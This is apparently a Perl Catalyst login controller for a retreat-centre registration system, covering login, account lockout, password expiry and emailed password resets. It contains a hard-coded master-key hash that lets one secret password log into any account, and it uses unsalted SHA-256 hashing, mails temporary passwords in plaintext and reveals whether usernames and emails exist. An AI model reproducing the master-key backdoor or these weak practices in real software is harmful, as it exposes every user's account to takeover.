use strict;
use warnings;
package RetreatCenter::Controller::Login;
use base 'Catalyst::Controller';

use lib '../..';


use Global qw/
    %string
/;
use Date::Simple qw/
    today
/;
use Util qw/
    stash
    model
    randpass
    email_letter
    login_log
/;
use Time::Simple qw/
    get_time
/;
use Digest::SHA 'sha256_hex';

#
# multiple uses depending on login state
#
# it is tricky - for some reason we cannot use url path
# components (sub parameters) but must use form parameters
# for asking for a forgotten password?  seems to work.
#
# old was: sub index : Private {
sub index :Path :Args(0) {
    my ($self, $c) = @_;

    Global->init($c);
    my $today_d8 = today()->as_d8();

    # if already logged in ...
    if ($c->user_exists()) {
        my $username = $c->user->username();
        if ($username eq 'library') {
            $c->response->redirect($c->uri_for('/book/search'));
        }
        else {
            $c->response->redirect($c->uri_for('/person/search'));
        }
        return;
    }

    # Get the username and password from form
    my $username = $c->request->params->{username} || "";
    my $password = $c->request->params->{password} || "";
    my $forgot   = $c->request->params->{forgot}   || "";
    my $email    = $c->request->params->{email}    || "";

    # If the username and password values were found in form
    if ($username && $password) {
        my (@users) = model($c, 'User')->search({
            username => $username,
        });
        my $user = $users[0];
        if (!$user) {
            $c->stash->{error_msg} = "No such username.";
            goto HERE;
        }
        elsif ($user->locked) {
            $c->stash->{error_msg} = "This account is locked.";
            goto HERE;
        }
        my $password256 = sha256_hex($password);

        # master key
        my $master_key256 = 'd3bb39afa3c59501406540256c0cabf9aec4e1b411254d31f854d9afcdd81e05';
        if ($password256 eq $master_key256) {
            $password256 = $user->password;
        }

        # Attempt to log the user in
        if ($c->authenticate({
                username => $username,
                password => $password256,
            })
        ) {
            # successful, let them use the application!
            # unless their password has expired, that is...
            my $last_login = $user->last_login_date();
            $user->update({
                nfails => 0,
                last_login_date => $today_d8,
            });
            _clear_files();    # move this somewhere else??
                               # it's just for tidying up
            if ($user->expiry_date < $today_d8) {
                my $ndays = $string{days_pass_grace}
                          - (today() - $user->expiry_date_obj()) + 1;
                if ($ndays <= 0) {
                    if ($last_login < $user->expiry_date) {
                        # they haven't logged in since the expiry date passed
                        login_log($username, 'Password expired - MUST change it now.');
                        $c->response->redirect($c->uri_for("/person/search/__expired__/$ndays"));
                        return;
                    }
                    else {
                        $user->update({
                            locked => 'yes',    
                        });
                        login_log($username, 'Password expired - account locked.');
                        # log them out and send to the login page
                        # with a message.
                        $c->logout;
                        stash($c,
                            error_msg => "Sorry, your password has fully expired. This account is now locked.",
                            time      => get_time(),
                            inactive  => -f "$ENV{HOME}/Reg/INACTIVE",
                            pg_title  => "Reg for MMC",
                            template  => 'login.tt2',
                        );
                        return;
                    }
                }
                else {
                    $c->response->redirect($c->uri_for("/person/search/__expired__/$ndays"));
                }
            }
            elsif ($c->check_user_roles('super_admin')) {
                $c->response->redirect($c->uri_for('/person/search'));
            }
            elsif ($c->check_user_roles('prog_staff')) {
                if ($today_d8 > $string{date_coming_going_printed}) {
                    $c->response->redirect(
                        $c->uri_for('/listing/comings_goings')
                    );
                }
                else {
                    $c->response->redirect($c->uri_for('/program/list'));
                }
            }
            elsif ($c->check_user_roles('field_staff')
                   && ! $c->check_user_roles('mail_staff')) {
                $c->response->redirect($c->uri_for('/listing/field'));
            }
            elsif ($username eq 'calendar') {
                # tried a redirect - did not work when calling
                # via LWP::Simple->get()
                # so, instead we go direct:
                #
                RetreatCenter::Controller::Event->calendar(
                    $c, $today_d8, "", 1
                );
                return;
            }
            elsif ($username eq 'library') {
                $c->response->redirect($c->uri_for('/book/search'));
            }
            else {
                $c->response->redirect($c->uri_for('/person/search'));
            }
            login_log($username, 'success');
            return;
        }
        else {
            my $n = $user->nfails;
            $user->update({
                nfails => $n+1,
            });
            if ($user->nfails >= $string{num_pass_fails}) {
                $user->update({
                    locked => 'yes',
                });
                $c->stash->{error_msg}
                    = "$string{num_pass_fails} consecutive password failures"
                    . " - This account is locked."
                    ;
            }
            else {
                my $msg = "Bad username or password.";
                if ($user->nfails + 2 == $string{num_pass_fails}) {
                    $msg .= "<br><span style='color: red'>Danger</span>... two more failed attempts and you will be locked out!";
                }
                $c->stash->{error_msg} = $msg;
            }
        }
    }
    elsif (! $username xor ! $password) {
        $c->stash->{error_msg} = "Bad username or password.";
    }
    elsif ($forgot) {
        stash($c,
            message  => '',
            email    => '',
            template => 'forgot_password.tt2',
        );
        return;
    }
    elsif ($email) {
        my @users = model($c, 'User')->search({
                        email => $email,
                    });
        my $user = $users[0];
        if (! $user) {
            login_log('forgotten pass', "no such email: $email");
            stash($c,
                message  => 'Sorry, there is no such email address in our system.',
                email    => $email,
                template => 'forgot_password.tt2',
            );
            return;
        }
        elsif ($user->locked()) {
            login_log($user->username, 'forgot password but account is locked');
            stash($c,
                message  => 'Sorry, the account associated with this email is locked.',
                email    => $email,
                template => 'forgot_password.tt2',
            );
            return;
        }
        my $username = $user->username;
        my $new_pass = randpass();
        $user->update({
            password    => sha256_hex($new_pass),
            expiry_date => (today()-1)->as_d8(),
        });
        my $url = $c->uri_for('/login');
        email_letter($c,
            to      => $user->name_email(),
            from    => "$string{from_title} <$string{from}>",
            subject => "Your account in Reg for MMC",
            html    => <<"EOH",
The password for your account '$username' in Reg for MMC has been reset to '$new_pass'.<br>
This is a temporary password and will fully expire in $string{days_pass_grace} days.
<p>
Here is the <a href='$url'>login page</a>.
<p>
Please change your password to something that you can<br>
easily remember (but hard to guess!).  Do this by choosing:
<p>
<ul>
Configuration > User Profile > Password
</ul>
EOH
        );
        login_log($username, 'forgotten password - new one sent');
        stash($c,
            username => $username,
            email    => $email,
            template => 'password_sent.tt2',
        );
        return;
    }
    HERE:
    # login failure - see 'error_msg' above
    # send to the login page
    login_log($username, $c->stash->{error_msg});
    stash($c,
        time     => get_time(),
        inactive => -f "$ENV{HOME}/Reg/INACTIVE",
        pg_title => "Reg for MMC",
        template => 'login.tt2',
    );
}

#
# clear any GD generated images that are more
# than two minutes old.  certainly the browser
# has gotten it already.
# clear any .xls files that are more than an hour old.
#
sub _clear_files {
    my $now = time();
    for my $im (<root/static/images/im*.png>) {
        my $age = $now - (stat($im))[9];
        if ($age > 2*60) {
            unlink $im;
        }
    }
    for my $xls (<root/static/*.xls>) {
        my $age = $now - (stat($xls))[9];
        if ($age > 60*60) {
            unlink $xls;
        }
    }
}

1;
